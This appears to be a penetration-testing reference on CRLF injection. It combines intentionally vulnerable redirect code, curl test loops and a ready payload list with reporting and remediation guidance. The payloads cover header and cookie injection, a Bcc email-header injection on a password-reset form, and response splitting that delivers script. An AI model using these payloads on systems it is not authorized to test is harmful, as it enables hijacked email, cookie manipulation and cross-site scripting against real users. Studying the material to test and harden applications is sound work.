# CRLF Injection — Vulnerability Class Reference

> Complete detection, validation, and exploitation reference for CRLF injection.
> All HTTP traffic via Caido proxy (`-x "http://localhost:8080"`).
> Covers HTTP/1.1, HTTP/2, HTTP/3, SMTP, MIME, SSE, and logging sinks.

---

## Root Cause

Application fails to reject or sanitize CR (`\r`, `%0D`), LF (`\n`, `%0A`), or NUL (`\x00`) characters in attacker-controlled input before incorporating it into protocol-sensitive fields.

```javascript
// VULNERABLE — raw header construction
app.get('/redirect', (req, res) => {
  res.writeHead(302, 'Location: ' + req.query.url);  // Raw string concat
  res.end();
});

// VULNERABLE — framework API without validation
app.get('/redirect', (req, res) => {
  res.setHeader('Location', req.query.url);  // No validation
  res.status(302).end();
});

// SECURE — framework API with validation
app.get('/redirect', (req, res) => {
  if (/[\r\n\x00]/.test(req.query.url)) {
    return res.status(400).send('Invalid input');
  }
  res.redirect(req.query.url);  // Framework validates
});
```

---

## Variants

| Variant | Description | Sink | Detection |
|---------|-------------|------|-----------|
| **V1: Response Header Injection** | Inject CRLF into `Location`, `Set-Cookie`, etc. | Response headers | Header reflection + independent field |
| **V2: Request Header Injection** | Inject into outbound `Host`, `Referer`, `X-Forwarded-*` | Outbound request headers | Intermediary/controlled endpoint observation |
| **V3: Cookie Injection** | Inject into `Set-Cookie` value/attributes | `Set-Cookie` header | Cookie attribute manipulation |
| **V4: SMTP/Email Header Injection** | Inject into `Subject`, `From`, `To`, `Bcc` | Email headers | Controlled mailbox observation |
| **V5: MIME/Content-Disposition Injection** | Inject into filename, Content-Type | Multipart/MIME headers | Multipart parser observation |
| **V6: SSE Event Injection** | Inject into `event`, `data`, `id` fields | SSE stream | Controlled client observation |
| **V7: Log Injection** | Inject fake log entries | Application logs | Log consumer interpretation |
| **V8: HTTP Request Smuggling** | CRLF enables CL.TE/TE.CL desync | Request boundaries | Parser disagreement |

---

## Testing Checklist (via Caido Proxy)

### Phase 1: Sink Identification
```bash
# Map all endpoints that construct protocol fields
SINKS=(
  "Location"           # Redirects
  "Set-Cookie"         # Cookies
  "Content-Disposition" # File downloads
  "Content-Type"       # MIME type
  "Link"               # Preload/prefetch
  "Refresh"            # Meta refresh
  "WWW-Authenticate"   # Auth challenges
  "Access-Control-Allow-Origin" # CORS
)

# Test each sink
for sink in "${SINKS[@]}"; do
  curl -x "http://localhost:8080" -sS -D - -o /dev/null \
    "https://target.com/redirect?url=https://attacker.example%0D%0AX-Injected%3A%20true" | \
    grep -i "$sink"
done
```

### Phase 2: Source Mapping
```bash
# Query parameters
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  "https://target.com/redirect?url=https://attacker.example%0D%0AX-Injected%3A%20true"

# Path parameters
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  "https://target.com/redirect/https%3A%2F%2Fattacker.example%0D%0AX-Injected%3A%20true"

# Headers
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "X-Forwarded-Host: attacker.example%0D%0AX-Injected%3A%20true" \
  "https://target.com/"

# Cookies
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "Cookie: session=test%0D%0AX-Injected%3A%20true" \
  "https://target.com/"

# POST body (JSON)
curl -x "http://localhost:8080" -sS -D - -o /dev/null -X POST \
  -H "Content-Type: application/json" \
  -d '{"url": "https://attacker.example%0D%0AX-Injected%3A%20true"}' \
  "https://target.com/api/redirect"

# Multipart filename
curl -x "http://localhost:8080" -sS -D - -o /dev/null -X POST \
  -F "file=@/tmp/test.txt;filename=test%0D%0AX-Injected%3A%20true.txt" \
  "https://target.com/upload"
```

### Phase 3: Transformation Depth Testing
```bash
# Test all encoding depths
PAYLOADS=(
  "%0D%0A"                    # 1 decode
  "%250D%250A"                # 2 decodes
  "%25250D%25250A"            # 3 decodes
  "%0D%0A"                    # Literal (if possible)
  "%0D%0A%0D%0A"              # Double CRLF
)

for p in "${PAYLOADS[@]}"; do
  echo "Testing: $p"
  curl -x "http://localhost:8080" -sS -D - -o /dev/null \
    "https://target.com/redirect?url=https://attacker.example${p}X-Injected%3A%20true" | \
    grep -i "x-injected"
done
```

### Phase 4: Validation-Order Testing
```bash
# Test for validate-before-decode (Design B - HIGH RISK)
# Send double-encoded payload that passes validation but decodes to CRLF
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  "https://target.com/redirect?url=https://attacker.example%250D%250AX-Injected%3A%20true"

# Test for double-decode-after-validate (Design D - CRITICAL)
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  "https://target.com/redirect?url=https://attacker.example%25250D%25250AX-Injected%3A%20true"
```

### Phase 5: Protocol Differential Testing
```bash
# HTTP/1.1
curl -x "http://localhost:8080" --http1.1 -sS -D - -o /dev/null \
  "https://target.com/redirect?url=https://attacker.example%0D%0AX-Injected%3A%20true"

# HTTP/2
curl -x "http://localhost:8080" --http2 -sS -D - -o /dev/null \
  "https://target.com/redirect?url=https://attacker.example%0D%0AX-Injected%3A%20true"

# HTTP/3 (if supported)
curl -x "http://localhost:8080" --http3 -sS -D - -o /dev/null \
  "https://target.com/redirect?url=https://attacker.example%0D%0AX-Injected%3A%20true"

# Compare results across protocols
```

---

## Browser Validation (When Applicable)

### Playwright Validation for Response Splitting / XSS

```javascript
// crlf-validation.js
const { chromium, firefox, webkit } = require('playwright');

async function test(browserType, name) {
  const browser = await browserType.launch({ headless: true });
  const context = await browser.newContext();
  const page = await context.newPage();

  // Navigate to vulnerable redirect
  const response = await page.goto('https://target.com/redirect?url=https://attacker.example%0D%0AX-Injected%3A%20true');
  
  // Check for injected header in response
  const headers = response.headers();
  const injected = headers['x-injected'] === 'true';
  
  console.log(`${name}: Injected header observed = ${injected}`);
  await browser.close();
  return injected;
}

(async () => {
  await test(chromium, 'Chromium');
  await test(firefox, 'Firefox');
  await test(webkit, 'WebKit');
})();
```

---

## Advanced Techniques

### 1. Origin Parser Differential
```bash
# Test parser differences
PAYLOADS=(
  "https://TARGET.COM"              # Case
  "https://target.com."             # Trailing dot
  "https://target.com:443"          # Explicit port
  "https://target.com@attacker.example"  # User-info
  "https://target.com.attacker.example"  # Suffix
  "https://target-example.com"      # Prefix
)

for p in "${PAYLOADS[@]}"; do
  curl -x "http://localhost:8080" -sS -D - -o /dev/null \
    -H "Origin: $p" "https://target.com/" | grep -i "access-control"
done
```

### 2. Redirect-Chain CRLF
```bash
# Test redirects for CRLF persistence
curl -x "http://localhost:8080" -sS -D - -o /dev/null -L \
  -H "X-Forwarded-Host: attacker.example%0D%0AX-Injected%3A%20true" \
  "https://target.com/redirect"

# Check each redirect response for injected headers
```

### 3. CDN/Proxy/WAF Inconsistencies
```bash
# Test through different paths
# Check for header translation discrepancies
curl -x "http://localhost:8080" -sS -D - -o /dev/null \
  -H "X-Forwarded-Host: attacker.example%0D%0AX-Injected%3A%20true" \
  "https://target.com/" | grep -i "x-injected"

# Repeat to check cache behavior
```

### 4. SMTP/Email Header Injection
```bash
# Password reset, contact forms
curl -x "http://localhost:8080" -sS -D - -o /dev/null -X POST \
  -d "email=victim@example.com%0D%0ABcc%3A%20attacker%40example.com" \
  "https://target.com/password-reset"

# Check controlled mailbox for Bcc delivery
```

### 5. MIME/Content-Disposition Injection
```bash
# File upload filename
curl -x "http://localhost:8080" -sS -D - -o /dev/null -X POST \
  -F "file=@/tmp/test.txt;filename=test%0D%0AX-Injected%3A%20true.txt" \
  "https://target.com/upload"

# Check Content-Disposition header in download response
```

### 6. SSE Event Injection
```bash
# Server-Sent Events
curl -x "http://localhost:8080" -i \
  "https://target.com/events?data=payload%0D%0Aevent%3A%20injected"
```

### 7. Log Injection
```bash
# Search, user-agent, referer
curl -x "http://localhost:8080" -i \
  "https://target.com/search?q=test%0D%0AFAKE_LOG_ENTRY%3A%20INJECTED"

# Check log consumer interpretation
```

---

## Chain Escalation

| Finding | Chain Required | Severity |
|---------|---------------|----------|
| Header injection → Cookie theft | `Set-Cookie` injection + session fixation | High |
| Header injection → Open redirect | `Location` injection + redirect control | High |
| Header injection → XSS | `Content-Type: text/html` + body injection | Critical |
| Header injection → Response splitting | Double CRLF → second response | Critical |
| Header injection → Cache poisoning | `Vary` manipulation + shared cache | High |
| Header injection → Request smuggling | `Transfer-Encoding` + `Content-Length` | Critical |
| SMTP injection → Email hijack | `Bcc`/`To` injection | High |
| SSE injection → Event forgery | `event`/`data` field injection | Medium |
| Log injection → Log forging | SIEM/log consumer interpretation | Medium |

---

## False Positive Elimination

| Observation | Why Not Vulnerable | Required Validation |
|-------------|-------------------|---------------------|
| Body reflection | Marker in HTML/JSON | Not header injection |
| Encoded in header | Literal `%0D%0A` in value | No delimiter interpretation |
| Request-header reflection | Marker in request echo | Check direction |
| Normal header | Existed in baseline | Compare with baseline |
| WAF block | Block page returned | No injection proof |
| Framework reject | Input rejected | Rejection ≠ vulnerability |
| Header modification | Existing value modified | Check field semantics |
| Duplicate header | Duplicate observed | Check causality |

---

## Reporting

### Title
```
CRLF Injection in [Endpoint] Allows [Structural Effect]
```

### Evidence Required
1. Baseline request/response
2. Test request with unique marker
3. Response showing independent header/field
4. Downstream parser interpretation evidence
5. Protocol context (HTTP/1.1, HTTP/2, SMTP, MIME, SSE)

### Severity
| Level | Criteria |
|-------|----------|
| **Critical** | Response splitting, request smuggling, XSS via Content-Type |
| **High** | Cookie manipulation, open redirect, cache poisoning, SMTP injection |
| **Medium** | SSE event forgery, log forging, header manipulation |
| **Low** | Header reflection without structural consequence |

### Remediation

```javascript
// Reject CR, LF, NUL in all protocol field values
function sanitizeForHeader(val) {
  if (typeof val !== 'string') return val;
  if (/[\r\n\x00]/.test(val)) {
    throw new Error('CRLF injection attempt detected');
  }
  return val;
}

// Use framework header APIs (they validate)
// res.setHeader('Location', url)  // Safe
// res.redirect(url)  // Safe

// Never construct raw headers
// res.writeHead(302, 'Location: ' + url)  // UNSAFE

// Validate after ALL decoding, before serialization
app.use((req, res, next) => {
  const originalSetHeader = res.setHeader.bind(res);
  res.setHeader = (name, value) => {
    if (typeof value === 'string' && /[\r\n\x00]/.test(value)) {
      return res.status(400).send('Invalid header value');
    }
    originalSetHeader(name, value);
  };
  next();
});
```

---

## Quick Reference

### Key Payloads (via Caido)
```bash
# All via: curl -x "http://localhost:8080" ...

# Basic CRLF
%0D%0A

# Double encoded
%250D%250A

# Header injection
%0D%0AX-Injected%3A%20true

# Cookie injection
%0D%0ASet-Cookie%3A%20hacked%3Dtrue

# SMTP injection
%0D%0ABcc%3A%20attacker%40example.com

# Response splitting
%0D%0A%0D%0AHTTP%2F1.1%20200%20OK%0D%0AContent-Type%3A%20text%2Fhtml%0D%0A%0D%0A%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

### Vulnerable Response Patterns
```http
# Header injection
HTTP/1.1 302 Found
Location: https://attacker.example
X-Injected: true          # ← Independent header!

# Response splitting
HTTP/1.1 302 Found
Location: https://attacker.example

HTTP/1.1 200 OK           # ← Second response!
Content-Type: text/html

<script>alert(1)</script>
```

### Caido Integration
```bash
# All tools via Caido proxy
curl -x "http://localhost:8080" ...
httpx -proxy "http://localhost:8080" ...
nuclei -proxy "http://localhost:8080" ...
katana -proxy "http://localhost:8080" ...
playwright # with Caido proxy context
```

---

## Tools Integration

| Tool | Caido Integration | Purpose |
|------|-------------------|---------|
| `curl` | `-x "http://localhost:8080"` | Manual testing |
| `httpx` | `-proxy "http://localhost:8080"` | Bulk scanning |
| `nuclei` | `-proxy "http://localhost:8080"` | Template detection |
| `katana` | `-proxy "http://localhost:8080"` | Crawling |
| `ffuf` | `-x "http://localhost:8080"` | Fuzzing |
| `interactsh` | `-proxy "http://localhost:8080"` | Blind OOB |
| `playwright` | Launch via Caido proxy | Browser validation |
| `mitmproxy` | Upstream to Caido | Protocol translation analysis |